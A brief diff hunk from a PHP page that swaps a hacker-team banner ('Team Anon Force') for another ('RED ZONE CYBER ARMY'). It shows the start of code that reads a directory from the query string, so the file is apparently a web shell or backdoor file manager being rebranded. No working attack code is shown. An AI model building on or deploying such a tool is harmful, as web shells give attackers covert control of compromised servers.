@@ -117,7 +117,7 @@
 	}
 </style>
 <body>
-	<center><h1>-= Team Anon Force =-</h1></center>
+	<center><h1>-= RED ZONE CYBER ARMY =-</h1></center>
   <div class="dir">
 	<?php  
 	if (isset($_GET['dir'])) {
